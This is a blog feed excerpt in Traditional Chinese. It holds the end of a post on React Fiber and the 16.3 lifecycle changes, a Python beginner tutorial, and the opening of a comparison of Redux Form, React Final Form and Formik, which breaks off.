除此之外就是我開頭提的那個順序的不一樣，這點也是值得注意的一個部分。雖然看起來不是什麼大問題，但如果不知道這點的話可能會生出一些莫名其妙的 Bug。
React 的未來React 16.3 在昨天正式發佈了，伴隨而來的是正式的 context API 以及 lifecycle 的改變。
隨著 Fiber 的正式上線，未來可以期待會有更多令人興奮的新功能。比如說在Sneak Peek: Beyond React 16這篇提到的time slicing，把整個 App 的體驗變得更順暢。
而Update on Async Rendering這篇文章也提到了非同步渲染的進展。
自從內部的機制改成 Fiber 之後，就讓 async rendering 得以發揮最大的效能。
但為了 async rendering，是需要付出一些代價的。原本的 lifecycle API 在這種場景底下可能會有一些問題，官方有給出許多常見的例子，也包含我們上面所說到的，componentWillMount會被呼叫多次的問題：
（忽略原本的範例程式碼，但大意就是在componentWillMount裡面 call API）

The above code is problematic for both server rendering (where the external data won’t be used) and the upcoming async rendering mode (where the request might be initiated multiple times).


The recommended upgrade path for most use cases is to move data-fetching into componentDidMount

對於 async rendering，會引起問題的是以下三個生命週期：

componentWillMount
componentWillReceiveProps
componentWillUpdate

這三個 lifecycle 會在 React 17 裡面被拿掉（如果你還是想用的話可以加上UNSAFE_，例如說改成UNSAFE_componentWillMount就一樣可以用），但既然都說是 UNSAFE 了，沒有理由繼續使用下去。
舊的不去新的不來，在最新發佈的 16.3 中，引入了兩個新的 lifecycle 來解決上面的那些問題：

getDerivedStateFromProps
getSnapshotBeforeUpdate

第一個很顯然是要來取代componentWillReceiveProps的，而第二個是拿來取代componentWillUpdate的。或其實有些場景底下，用componentDidUpdate也可以取代原本那兩個生命週期。
至於最前面所提到的componentWillMount，則建議把裡面的程式碼搬到componentDidMount去。
接著讓我們快速來看一下新的生命週期如何替代舊的，以下我就直接使用官方給的範例了。這個範例會偵測 props 來決定要不要改變 state，是很常見的應用場景：
// Beforeclass ExampleComponent extends React.Component &#123;  state = &#123;    isScrollingDown: false,  &#125;;    componentWillReceiveProps(nextProps) &#123;    if (this.props.currentRow !== nextProps.currentRow) &#123;      this.setState(&#123;        isScrollingDown:          nextProps.currentRow &gt; this.props.currentRow,      &#125;);    &#125;  &#125;&#125;

而新的生命週期static getDerivedStateFromProps，會在 component 被建立還有收到新的 props 的時候被呼叫，但只會傳入新的 props 跟舊的 state，因此我們可以這樣改：
// Afterclass ExampleComponent extends React.Component &#123;  // 初始化 state  state = &#123;    isScrollingDown: false,    lastRow: null,  &#125;;    static getDerivedStateFromProps(nextProps, prevState) &#123;    // 把新的 props 跟舊的 state 做比較    if (nextProps.currentRow !== prevState.lastRow) &#123;      // 回傳新的 state      return &#123;        isScrollingDown: nextProps.currentRow &gt; prevState.lastRow,        lastRow: nextProps.currentRow, // 同步一下 state      &#125;;    &#125;      // return null 代表不用改變 state    return null;  &#125;&#125;

其實說穿了就只是你自己把以前componentWillReceiveProps會傳來的prevProps存到 state 裡面，改成跟 state 來比較而已。
看到這邊你可能會很疑惑：「那為什麼 getDerivedStateFromProps 不直接把 prevProps 傳進來就好？」
React 官方給的理由有兩個：

因為 getDerivedStateFromProps 在初始化的時候也會被 call，所以第一次的 prevProps 會是 null，代表你每次都要做一次 null check，這樣不好
不傳 prevProps 就代表 React 不用幫你記住 prevProps 了，對未來在記憶體上面的優化有幫助

總之呢，以後就不會有componentWillReceiveProps可以用了，你要自己把需要的prevProps保存在 state 裡面，並且在getDerivedStateFromProps裡面進行比較。
再看另外一個例子，這個例子的目的是要在新增 item 的時候維持捲軸的位置，所以必須在 update 之前保存舊的高度，在 update 之後去調整捲軸的位置：
class ScrollingList extends React.Component &#123;  listRef = null;  previousScrollHeight = null;    componentWillUpdate(nextProps, nextState) &#123;    // 有新增 item 的話，記住現在的高度    if (this.props.list.length &lt; nextProps.list.length) &#123;      this.previousScrollHeight = this.listRef.scrollHeight;    &#125;  &#125;    componentDidUpdate(prevProps, prevState) &#123;    // 如果 previousScrollHeight 不是 null，代表有新增 item    // 調整捲軸位置    if (this.previousScrollHeight !== null) &#123;      this.listRef.scrollTop += this.listRef.scrollHeight - this.previousScrollHeight;      this.previousScrollHeight = null;    &#125;  &#125;    render() &#123;    return (      &lt;div ref=&#123;this.setListRef&#125;&gt;        &#123;/* ...contents... */&#125;      &lt;/div&gt;    );  &#125;    setListRef = ref =&gt; &#123;    this.listRef = ref;  &#125;;&#125;

那這樣子會帶來的問題是什麼呢？還記得我們前面有提過 Fiber 有兩個階段嗎？render 跟 commit。這兩個階段會有時間差，而componentWillUpdate是處於第一個階段，componentDidUpdate是屬於第二個階段。
假如使用者在這兩個階段之間做了一些事情，例如說調整視窗的尺寸，那你存的高度就不會是正確的了，而是會拿到舊的值。
解決方法就是利用新的生命週期getSnapshotBeforeUpdate，這個會在 DOM 被更新之前呼叫，可以保證你拿到的東西一定是最新的。
class ScrollingList extends React.Component &#123;  listRef = null;    getSnapshotBeforeUpdate(prevProps, prevState) &#123;    // 如果 list 有變動，就回傳現在的捲軸高度    // 這個回傳值會被當作 componentDidUpdate 的第三個參數    if (prevProps.list.length &lt; this.props.list.length) &#123;      return this.listRef.scrollHeight;    &#125;    return null;  &#125;    componentDidUpdate(prevProps, prevState, snapshot) &#123;    // snapshot 就是上面回傳的那個值    // 如果不是 null，就利用 snapshot 來調整捲軸高度    if (snapshot !== null) &#123;      this.listRef.scrollTop +=        this.listRef.scrollHeight - snapshot;    &#125;  &#125;    render() &#123;    return (      &lt;div ref=&#123;this.setListRef&#125;&gt;        &#123;/* ...contents... */&#125;      &lt;/div&gt;    );  &#125;    setListRef = ref =&gt; &#123;    this.listRef = ref;  &#125;;&#125;

總之呢，結合搭配使用 commit phase 的 lifecycle（componentDidMount、componentDidUpdate、componentWillUnmount ）以及新引進的getDerivedStateFromProps與getSnapshotBeforeUpdate ，就可以取代掉舊的那些有可能會造成問題的 lifecycle。
如果想要看更多範例的話，這篇很值得參考：Update on Async Rendering。
結論效能一直是 Web App 很注重的一個點，而需要把握的原則就只有一個：不要 block main thread。只要 main thread 可以做事，它就可以去處理其他事情，例如說響應使用者的 click 或是繪製新的畫面等等。
而 React 原本的機制會造成問題，因此將內部核心用 Fiber 改寫，把一大個不可中斷的任務切割成許多小的、可以中斷的工作，而可以切割之後也使得以後有平行化的可能，render 的速度可能又會更快一點。
但也因為這樣機制的改變，影響到原本的生命週期，一個不小心就會出狀況，而官方也發布了新的兩個生命週期來解決這個問題。
身為 React 長期的使用者，對這種大的改變雖然覺得要改 code 很煩，但長期來看其實是利多，畢竟可以做的事情又更多了，效能也會愈來愈好。
這篇總結了近期我研究 Fiber 跟關注 React 新的變化的一些心得，Fiber 底層的實作機制因為我也不是很理解，所以不敢出來班門弄斧，只希望能透過白話文讓大家理解這個機制大概是長怎樣。
如果有哪邊有講錯，還麻煩不吝指正，感謝。
參考資料：

React Fiber Architecture
What is React Fiber ?
React中state render到html dom的流程分析
完全理解React Fiber
[翻譯] React Fiber 現狀確認
React v16.3.0: New lifecycles and context API
React Docs - Scheduling
浅谈React 16中的Fiber机制
Lin Clark - A Cartoon Intro to Fiber - React Conf 2017

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>react,fiber,react lifecycle</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 101 快速入門教學</title>
    <url>/2016/12/17/python101-tutorial/</url>
    <content><![CDATA[ 
什麼是 Python？Python 是一種物件導向、直譯式的跨平台電腦程式語言，它包含了一組功能完備的標準庫和豐富套件生態系，可以輕鬆完成很多常見的任務（例如：讀寫檔案、自然語言處理、網路爬蟲、網站開發、機器學習等），因為它可以很輕易整合其他底層語言，所以又稱為膠水語言。它的語法簡單，與其它大多數程式設計語言使用大括弧不一樣，它使用縮進來定義語句塊。由於具備簡潔易學等特性，許多開發者推薦 Python 為初學者第一個學習的程式語言。由於版本更迭，我們接下來討論的主要是以 Python3 為主，若電腦沒有安裝的話，你可以在官方網站下載，若你不是安裝 Anaconda 這個 all-in-one 版本的話（自帶許多套件和科學運算工具），記得要安裝 pip、IPython。 
Python 設計風格Python 主要設計的原則和特色就在於簡潔：應該會有一種明顯的作法（最好也只有一種），可以完成工作。
更多有關 Python 設計風格可以在終端機進入 python3 互動模式後輸入 import this：
$ python3Python 3.5.2 (default, Oct 11 2016, 05:00:16)[GCC 4.2.1 Compatible Apple LLVM 7.0.2 (clang-700.1.81)] on darwinType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import thisThe Zen of Python, by Tim PetersBeautiful is better than ugly.Explicit is better than implicit.Simple is better than complex.Complex is better than complicated.Flat is better than nested.Sparse is better than dense.Readability counts.Special cases aren&#x27;t special enough to break the rules.Although practicality beats purity.Errors should never pass silently.Unless explicitly silenced.In the face of ambiguity, refuse the temptation to guess.There should be one-- and preferably only one --obvious way to do it.Although that way may not be obvious at first unless you&#x27;re Dutch.Now is better than never.Although never is often better than *right* now.If the implementation is hard to explain, it&#x27;s a bad idea.If the implementation is easy to explain, it may be a good idea.Namespaces are one honking great idea -- let&#x27;s do more of those!

空白格式首先，我們要了解 Python 和其他語言最大的不同就是使用縮排來切分程式碼，這和其他語言使用 {} 不同。
for i in [1, 2, 3]:	print(i)	for j in [1, 2, 3, 4]:		print(j + i)print(&#x27;finish&#x27;)

不過初學者很容易在縮排遇到問題，若是出現以下訊息就可以檢視是否哪裡縮排有問題：
IndentationError: expected an indented block

模組在 Python 生態系中有豐富的模組和工具。一般情況預設不會載入任何模組，但當你有特定開發需求可以使用第三方工具將模組匯入（import）。若是當模組名稱很長時通常我們會使用別名。
import re as regexmy_regex = regex.compile(&#x27;[0-9]+&#x27;, regex.I)

若是只是需要模組中的特定功能，也可以使用比較精準的引入方式 from import，引入到整個命名空間中，使用時前面就不用寫模組名（但要注意有可能覆寫）：
from collections import defaultdict, Counterlookup = defaultdict(int)my_counter = Counter()

資料型別在 Python 有以下幾種內建的資料型別，基本資料型別有 Number、String、Boolean

數字（Number）
 num1 = 3num2 = 2num3 = num1 / num2

字串（String） 字串使用上會使用單引號或雙引號成對包起（’, “）
 str = &#x27;data engineer&#x27;# 字串長度len(str)# 原始字元es_str = r&#x27;\t&#x27;# 2len(es_str)

 若是多行的情形：
 multi_line_str = &quot;&quot;&quot;多行多行&quot;&quot;&quot; 

布林值（Boolean） 決定邏輯判斷，True 或 False。注意在 Python 中布林值首字是大寫
 is_num_bigger_than_one = 1 &lt; 2

 在 Python 中 None 地位類似於 null
 x = Noneprint(x == None)
 以下為 Python 的 Falsy 值：

False 
None
[]
{}
“”
set()
0
0.0

 可以搭配 and, or, not 使用

列表（List） 列表可以說是 Python 中最基礎的一種資料結構。所謂列表指的就是一群按照順序排序的元素（類似於其他程式語言的 array，但多一些額外功能）。
 list_num = [1, 2, 3]list = [&#x27;string&#x27;, 1, [], list_num]list_length = len(list_num)	num_sum = sum(list_num)print(list_length)print(num_sum)

 運用 [] 取值（index 從 0 開始）：
 x = range(10) # [0, 1, 2, ..., 9]zero = x[0] # 0nine = x[-1] # 9x[0] = -1

 切割（[起始 index, 結束 index 但不包含]）：
 print(x[:3]) # [-1, 1, 2]print(x[3:]) # [3, 4, 5,..., 9]print(x[1:5]) # [1, 2, 3, 4]print(x[0:-1]) # [1, 2, ..., 8]print(x[-1:-1]) # [-1, 1, ..., 9]

 檢查元素是否在列表中（逐一檢查，效率較差）：
 1 in [1, 2, 3] # True

 串接列表：
 x = [1, 2, 3]x.extend([4, 5, 6])

 x = [1, 2, 3]y = x + [4, 5, 6]

 x = [1, 2, 3]x.append(0) # [1, 2, 3, 0]

 賦值方式：
 x, y = [1, 2]

 _, y = [1, 2]

元組（Tuple） Tuple 類似於 List 的兄弟，比較大差別在於 Tuple 是 immutable，也就是說宣告後不能修改。列表使用 []，而元組使用 ()
 my_list = [1, 2]my_tuple = (1, 2)my_list[1] = 3try:	my_tuple[1] = 4except TypeError:	print(&#x27;cannot modify a tuple&#x27;)

 多重賦值
 x, y = 1, 2x, y = y, x # x == 2, y == 1

字典（Dictionary）
 字典類似 map，包含鍵值與對應的值，可以快速取出對應值：
 dict1 = &#123;&#125; # 建議寫法dirct2 = dict()grades = &#123; &#x27;Mark&#x27;: 70, &#x27;Jack&#x27;: 40 &#125;grades[&#x27;Mark&#x27;]

 給定值：
 grades[&#x27;KD&#x27;] = 100len(grades) # 3

 使用事先檢驗鍵或是使用 get 方法：
 try:	grade = grades[&#x27;XD&#x27;]except KeyError:	print(&#x27;no grade for XD&#x27;)grades.get(&#x27;XD&#x27;, 40) # 若無則使用 default 值

 取出所有值：
 grades = &#123; &#x27;Mark&#x27;: 70, &#x27;Jack&#x27;: 40 &#125;grades.keys() # 所有鍵值組成的 listgrades.values() # 所有值組成的 listgrades.items() # 所有鍵值組成的 tuple of list [(&#x27;Mark&#x27;, 70)]

 defaultdict：
 當你檢查一個不存在的鍵值時，會用零參數函式添加一個事先設定的新值，這是一種比較優雅的作法
 在介紹 defaultdict 之前先介紹一般作法
 # 例外處理word_counts = &#123;&#125;for word in document:	try:		word_counts[word] += 1	except KeyError:		word_counts[word] = 1# 使用 getword_counts = &#123;&#125;for word in document:	previous = word_counts.get(word, 0)	word_counts[word] = previous_count + 1

 defaultdict 作法（不用每次檢查鍵直視否存在）
 # 匯入 defaultdictfrom collections import defaultdictword_counts = defaultdict(int) # 會生成 0for word in document:	word_counts[word] += 1

 也可以使用 list 或 dict 甚至是自己定義的函式來做為 defaultdict 的零參數函式：
 dd_list = defaultdict(list)dd_list[1].append(2) # &#123; 1: [2] &#125;dd_list = defaultdict(list)dd_list[&#x27;Mark&#x27;][&#x27;City&#x27;] = &#x27;Bay Area&#x27; # &#123; &#x27;Mark&#x27;: &#123; &#x27;City&#x27;: &#x27;Bay Area&#x27;&#125; &#125;dd_list = defaultdict(lambda: [0, 0])dd_pair[2][1] = 1

 Counter：可以把一系列值轉成類似 defaultdict(int) 的東西，裡面每個值都對應到相應的數量，主要會使用來建立直方圖 
 from collections import Counterc = Counter([0, 1, 2, 0]) # &#123; 0: 2, 1: 1, 2: 1 &#125; word_counts = Counter(document)

 每個 Counter 實例都有個 most_common 的方法
 for word, count in word_counts.most_common(10):	print(word, count)

集合（Set） 集合類似數學中的集合，裡面包含不重複的元素值
 s = set()s.add(1) # &#123; 1 &#125;s.add(2) # &#123; 1, 2 &#125;s.add(2) # &#123; 1, 2 &#125;len(s) # 2 1 in s # True

 集合在判斷元素是否存在的效率相對較好，此外，對於判斷不重複值也很方便
 list_item = [1, 2, 3, 1, 2, 3]set_item = set(list_item) # &#123;1, 2, 3&#125;lsit(set_item) # [1, 2, 3]

解析式列表（comprehensive list）在 Python 我們通常會需要把某個 list 轉換成另外一個 list，比如只挑選其中幾個元素，或是對期中某些元素進行轉換。
even_numbers = [x for x in range(5) if x % 2 == 0]squares = [x for x in range(5) if x % 2 == 0]even_squares = [x * x for x even_numbers]# 不操作值的話zeros = [0 for _ in even_numbers] # 和 even_numbers 長度一樣值都為 0 的串列

建立 set 和 dict
square_dict = &#123; x : x * x for x in range(5) &#125;square_set = &#123; x * x for x in [1, -1] &#125; # &#123; 1 &#125;pairs = [(x, y) for x in range(10) for y in range(10)] # (0, 0), (0, 1)p = [(x, y) for x in range(3) for y in range( x + 1, 10)]

函式函式（function）是重複使用的程式區塊，有輸入輸出。在 Python 中我們會使用 def 來定義函式：
def sum(x, y):	return x + y 

Python 的函數和 JavaScript 一樣，屬於一級函式（first-class）。我們可以將函數指定給某個變數，然後把它傳給某個函數中，就像是平常把參數傳入函式一樣。
def apply_f(fun):	return fun(3, 2)def sum(x, y):	return x + y sum_fun = sumnum = apply_f(sum)print(num) // 5

匿名函數使用方式（類似 ES6 arrow function 簡化寫法，前面是參數後面是操作）：
y = apply_f(lambda x: x + 4)

函式參數預設值：
def my_print(message=&quot;default&quot;):	print(message)my_print(&quot;hello python&quot;)my_print() 

args 與 kwargs若我們希望函式可以接受任意參數，我們可以使用 args（由無名稱參數組成的元組） 和 kwargs（由無名稱參數組成的字典）：
def magic(*args, **kwargs):	print(&#x27;unnamed args:&#x27;, args)	print(&#x27;keywords args:&#x27;, kwargs)magic(1, 2, key=&#x27;word&#x27;, key2=&#x27;word2&#x27;) # unnamed args: (1, 2)# keywords args: &#123;&#x27;key&#x27;: &#x27;word&#x27;, &#x27;key2&#x27;: &#x27;word2&#x27;&#125;

可以用來協助建立以函式當做參數的高階函式：
def double(f):	def g(*args, **kwargs):		return 2 * f(*args, **kwargs)	return gdef f2(x, y):	return x + yg = doubler_correct(f2)print(g(1, 2))

常見內建函式除了自己可以建立函式外，Python 本身也提供許多好用的內建函式：

all：列表中所有元素為真
  all([True, 1, &#123; 3 &#125;]) # Trueall([True, 1, &#123; &#125;]) # Falseall([]) # True，沒有元素為假

any：列表中只要有任何元素為真
  any([True, 1, &#123;&#125;]) # Trueany([]) # False，沒有元素為真

enumerate：列舉
  我們常需要反覆取得列表中每個元素及其索引值
  # choice 1for i in range(len(documents)):	document = documents[i]	do_something(i, document)# choice 2i = 0for document in documents:	do_something(i, document)	i += 1

  使用 enumerate：
  for i, document in enumerate(documents):	do_something(i, document)# 僅需要 indexfor i, _ in enumerate(documents): do_something(i)

zip：合併將多個 list 合併成 tuple of list
  list1 = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]list2 = [1, 2, 3]zip(list1, list2) # [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2)]zip(*[(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]) == zip((&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)) # [(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;), (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)]

  # * 可以參數拆分def add(a, b): return a + badd(1, 3) # 4add([1, 3]) # TypeErroradd(*[1, 3]) # 4

range：取得一序列
  range(0, 10) # 0, 1, 2, ... 9

random：生成隨機數字
  import randomrandoms = [random.random() for _ in range(4)] # 生成長度為 4 內涵值為 0 - 1 不含 0 的 list

  事實上，random 產生的是偽隨機數字，透過 seed 設定可以取得同樣值
  import randomrandom.seed(10) # 把 seed 設為 10print(random.random()) # 0.5714025946899135random.seed(10) # 把 seed 設為 10print(random.random()) # 0.5714025946899135 

  隨機產生範圍內數字：
  random.randrange(10)random.randrange(3, 6)

  針對列表隨機排列：
  num = range(10)random.shuffle(num)

  random.choice([&#x27;Mark&#x27;, &#x27;Bob&#x27;, &#x27;Jack&#x27;])

  隨機取樣不放回：
  nums = range(10)random.sample(nums, 3)

  隨機取樣放回：
  nums = range(10)random.choice(nums, 3)

sort：針對 list 進行排序（由小到大），會改變原來的 list。sorted 不會改變原來 list
  x = [4, 1, 2, 3]y = sorted(x) # [1, 2, 3, 4] 不會改變到 xx.sort() # x 變成 [1, 2, 3, 4]

  若想改成由大到小排序
  x = sorted([-4, 1, -2, 3, key=abs, reverse=True]) # [-4, 3, -3, 2] 絕對值由大到小

  若是在 key 指定一個函數，就會用這個函數結果去做排序
  wc = sorted(word_counts.items(), key=lambda (word, count): count, reverse=True) # 針對單字數量多到小排序

partial：使用函式工具創建另一個函式
  from functools import partialdef exp(base, power):	return base ** powertwo_to_the = partial(exp, 2)print_two_the(3)

map：
  def multiply(x, y):	return x * ymap(multiply, [1, 2], [1, 2]) # [1, 4]

filter：
  def is_even(x):	return x % 2 == 0filter(is_even, [2, 5, 6]) # [2, 6]

reduce：
  def multiply(x, y):	return x * yreduce(multiply, [1, 2, 3]) # 1 * 2 * 3

控制流程
if…elif…else
 if 1 &gt; 2:	message = &#x27;if onlt 1 were greater than two&#x27;elif 1 &gt; 3: 	message = &#x27;elif == else if&#x27;else:	message = &#x27;else&#x27;

 三元運算子：
 parity = &#x27;even&#x27; if x % 2 == 0 else &#x27;odd&#x27;

for…in 
 較複雜情況我們會搭配 continue 和 break 使用：
 for x in range(10): # 0...9 不含 10	if x == 3:		continue	if x == 5:		break	print(x)

while
 x = 0while x &lt; 10:	print(&#x27;x is less than 10&#x27;)	x += 1

生成器（generator）與迭代操作事實上，list 有個問題就是很容易變得很大。例如：range(1000000) 就會製造出一個包含一百萬的元素的 list。若是想要使用其中幾個元素，效能就會變得很差。此時使用生成器（generator）就是一個每次只生成所需數值的一種 lazy 作法。
使用函式和 yield
def lazy_range(n):	i = 0	while i &lt; n:		yield i		i += i

for i in lazy_range(10):	do_something(i)

或是在小括號使用運算解析式
lazy_evens_below_20 = (i for i in lazy_range(20) if i % 2 == 0)另外，每個 dict 都有一個叫做 items() 的方法iteritems() # 可以一次生成一個鍵值對

裝飾器（decorator）裝飾器本身是一個函式，主要是借助閉包力量產生一個可以修飾函式的函式：
@print_fun(title=&#x27;title:&#x27;)def add(*tup):	return sum(tup)# 以下兩者相同add(1, 2, 3, 4)add = print_fun(title=&#x27;title:&#x27;)(add)# 裝飾器撰寫def print_fun(title):	def decorator(func):		def modified_func(*args, **kwargs):			result = func(*args, ** kwargs)			print(title, result)		return modified_func	return decorator

正規表達式與許多程式語言一樣，Python 同樣提供正規表達式的用法，可以方便擷取文字。
import reprint.all([re.match(&#x27;a&#x27;, &#x27;cat&#x27;),re.search(&#x27;a&#x27;, &#x27;cat&#x27;)])

物件導向程式設計（OOP）Python 也是物件導向程式語言：
class Set:	def __init__(self, values=None):		# 建構函數		s1 = Set()		s2 = Set([1, 2, 3])		self.dict = &#123;&#125; 		if values is not None:			for value in values:				self.add(value)	def __repr__(self):		return &quot;Set&quot; + str(self.dict.keys())	def add(self, value):		self.dict[value] = True	def contains(self, value):		return value in self.dict	def remove(self, value):		del self.dict[value]# 使用物件s = Set([1, 2, 3])s.add(4)print(s.contains(4))

例外狀況若是程式出現錯誤的話會送出 exception，若不妥善處理的話程式很有可能會掛掉，在 Python 中例外處理可以使用 try…except：
try:	print(1/0)except ZeroDivisionError:  	print(&#x27;cannot divide by zero&#x27;)

總結本文快速介紹了 Python 的基礎概念，當讀者學會了 Python 後，事實上可以嘗試使用 Python 開發不同的網路應用程式或是資料科學，甚至是自然語言處理的應用。
延伸閱讀
15 Essential Python Interview Questions
8 Essential Python Interview Questions*
Python Interview Questions
What are good Python interview questions?
Top 40 Python Interview Questions &amp; Answers 
Top Python Interview Questions And Answers
Python Interview Questions
12步教你理解Python装饰器

（image via fedoramagazine）
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python, Django, MVC, Web, MTV, Web Backend, Web Framework, 教學, Flask, 框架</tag>
      </tags>
  </entry>
  <entry>
    <title>React Form: Redux Form vs React Final Form vs Formik and Yup</title>
    <url>/2019/05/03/react-form/</url>
    <content><![CDATA[
本文會先從為何要做表單狀態管理說起，接著看目前市面上有哪些好的表單函式庫和條列挑選原則，並探討三個表單函式庫 Redux Form、React Final Form、Formik &amp; Yup，最後做比較和總結。
為何需要做表單狀態管理？為什麼需要做表單狀態管理呢？這就要從 controlled component 和 uncontrolled component 開始談起。
在一般 HTML 的世界裡面，表單的狀態是由元件本身來做儲存和更新的，稱之為「uncontrolled component」；而在 React 的世界裡，表單的狀態和值的更新是由開發者處理，如下圖所示，表單欄位的值可從 props 或 state 取得，在這裡是 state，並且當使用者打字等行為時觸發事件來做值的更新，在這裡是觸發 onChange 事件，這樣的元件稱為「controlled component」。這樣值的儲存與更新的管理方式，就是表單簡易的狀態管理的例子，表單還有其他狀態要管理，例如：表單是否合法（valid）、各欄位的錯誤訊息（validation、error）、欄位值是否被更改過（dirty）、初始值的設定（initial value）、各種 callback 的設定等。

也因為由開發者來管理表單的狀態，所以我們可能需要自己刻一套管理工具，或是使用市面上大師們已經實作好的函式庫就好了，不管是自已刻還是用別人刻好的，在專案的開發上，都可以達到兩個效果…

不用重造輪子，節省開發時間，若每次實作表單都要重做一次表單狀態管理機制就太辛苦了 XD
若是多人開發專案，就能統一彼此的實作方式，減少維護的難度。

當紅的表單函式庫先不要談自己刻這件事，來看看大師們幫我們刻好的表單函式庫有哪些…

由上圖可知，可選擇的表單函式庫真的很多，大致上可分類為功能完整、輕量或內建驗證工具等共三種，另外還有一些是進入維護狀態、不再開發新功能的，就不納入評選。

功能完整是指 API 開得很充足的函式庫，可讓開發者實作細緻的表單元件，當然也能減少撰寫程式碼，例如：Redux Form（功能真是包山包海）、React Final Form、Formik、Informed。
強調輕量亦即打包後的檔案很小，適合對體積大小有顧慮的專案，例如：Final Form、React Final Form、Formsy React。
內建驗證工具的函式庫讓開發者能很方便的撰寫驗證規則，例如：Formik、Informed、React Forms。

接下來我選擇 Redux Form、React Final Form 和 Formik &amp; Yup 來做討論。
如何選擇好的表單函示庫？先綜觀來看怎麼選擇好的表單函示庫。一般來說，這些函式庫主要都是做狀態管理，而它們都做得很好，只是有些差異，因此歸納了一些挑選原則…

這個函式庫是怎麼做狀態管理的？會不會有效能問題？
API 充足嗎？能為開發者減少撰寫多少程式碼？通常 API 充足的函式庫，打包後的檔案體機會比較大，只能取捨一下了。
如何撰寫驗證邏輯？
擴充性如何？是否能輕易新增和移除功能以符合未來的需求？
文件是否詳細？範例是否充足？之後若遇到問題是否能很快被解決？
打包後的檔案大小。
Github 星星數 and NPM 下載數。這是比較不重要的考量點，畢竟過去火紅的專案，目前可能已不符合需求，但已長時間累積了很多的星星數和下載數；而新出來的專案可能因起步較晚而沒有很多的星星數和下載數，但做得卻非常好。
函式庫提供的特點是否能解決專案的需求？

Redux Form
Redux Form 利用 Redux 來儲存整個 app 的表單狀態，再根據當前所需提取特定表單資料。也就是說，先在 Redux store 建立表單的 reducer，經由 HOC 的方式連接表單和 store，再由 props 帶入資料。
Workflow
圖片來源：Redux Form - Getting Started
Redux Form 的工作流程是這樣的…
當使用者對表單元件輸入資料時會發出 action 去更新 store，當狀態被更新，就會重新渲染元件，使用者就能看到剛才輸入的資料。
Demo範例 1這是一個簡易的表單範例，並且使用 redux-form-validators 作為驗證的工具。

在這個範例中有兩個欄位 Name 和 Email，初始值就不是合法的了，所以若在此時按下按鈕 Submit 提交表單，會看到 Name 下方紅色的錯誤訊息「Length must exceed 3 characters.」

在修正欄位值後，就可以順利提交了。

來看原始碼，如果想得到特定表單的資訊，必須從 reducer 中使用 selector 提取出來，然後再用 props 帶進表單，例如：formData、formValues 和 formErrors。formData 會取得目前表單所有欄位的狀態，例如這個欄位是否被 touched、dirty 或目前 focus 在哪個欄位等；formValues 取得目前表單各欄位的值；formErrors 取得目前表單各欄位的錯誤訊息。
Form = connect((state) =&gt; (&#123;  formMeta: getFormMeta(&#x27;register&#x27;)(state), // get form data by using selectors  formValues: getFormValues(&#x27;register&#x27;)(state),  formErrors: getFormSyncErrors(&#x27;register&#x27;)(state),&#125;))(Form);

在 selector 這裡要輸入唯一的表單名稱「register」，我常常不是打錯字就是輸入重複的名稱，感到困擾和麻煩 XD
另外，在這裡搭配 redux-form-validators 作為驗證工具，它提供一些簡易的 field-level validation 驗證規則，並且可自訂錯誤訊息，也可經由 addValidator 加入驗證規則。
簡易使用方式如下，將 name 這個欄位加上驗證規則必填（required）和字數限制（length，必須超過 4 個字），並自訂報錯訊息。
Demo，原始碼。
&lt;Field  name=&#x27;name&#x27;  validate=&#123;[    required(&#123; message: &#x27;Required.&#x27; &#125;),    length(&#123; min: 4, message: &#x27;Length must exceed 3 characters.&#x27; &#125;),  ]&#125;/&gt;

範例 2這是一個混合同步和非同步驗證的範例，同步驗證像是名稱是否必填、字數限制至少 4 個字，email 是否合法；非同步驗證像是詢問使用者的名稱是否已被使用，輸入「paul」表示已被別人使用了，這是模擬從伺服器端回傳驗證結果，再顯示錯誤訊息的範例。

Demo，原始碼，其他範例還有建立動態欄位。
優點
提供充足的 API 能實作細緻的元件。
可混合同步與非同步驗證。
由於 Redux Form 本身並沒有提供驗證工具，但可自行實作驗證的部份或搭配他人寫好的工具，例如：redux-form-validators 或 redux-form-yup，相對是很有彈性的。

缺點
表單狀態不需要存在全域的 store 裡面，畢竟表單狀態與其他原件無關。
每當表單更新狀態就會更新 store，亦即使用者每打一個字都會做更新，整個表單就會重新渲染，造成不需要更新的欄位也被重新渲染，影響效能（備註），這在表單很大的時候，延遲狀況尤其明顯。之後我們會看到兩個效能較佳的表單函式庫-React Final Form 和 Formik。React Final Form 有訂閱表單和欄位狀態的機制；而 Formik 有 Fastfield 元件，利用實作 shouldComponentUpdate 的機制決定要不要重新渲染該欄位，都能有效限制渲染的次數。
必須使用 Redux。若 app 很小，不需使用 Redux 做狀態管理，卻必須因為表單而使用 Redux 才能用 Redux Form；又或者是 app 並非使用 Redux 做狀態管理就不能使用 Redux Form。
壓縮後的打包大小較大，超過 26.7KB。React Final Form + Final Form 是 7.7KB，而 Formik 是 12KB。
非同步驗證只支援 form-level 的驗證，在實作上來說，若能在欄位設定驗證規則是比較直覺和方便的。
文件和範例不夠充足、不夠詳細。
缺少擴充性。

關於以上的缺點，不管是表單狀態的儲存、打包大小、文件與範例、擴充性等，接下來我們會看到兩個做得更好的函式庫-React Final Form 和 Formik。
備註：減少不必要的渲染是指在 React 做 virtaul dom 的比對而決定是否要渲染前，可利用元件實作的機制而省下這複雜計算過程，因此能減少延遲效果。
Final Form
在看 React Final Form 之前，先來看它的狀態管理引擎 Final Form。由於 Final Form 是表單狀態管理的引擎，因此與框架無關，並且可以獨立使用或實作 React 或 Vue 的 wrapper 包裝後來使用它。
Final Form 的特點如下

由於是狀態管理引擎，因此與框架無關，可以獨立使用或實作 React 或 Vue 的 wrapper 包裝後來使用它。
Final Form 利用訂閱的機制來選擇要追蹤的狀態，若追蹤的狀態有更新再通知更新元件。
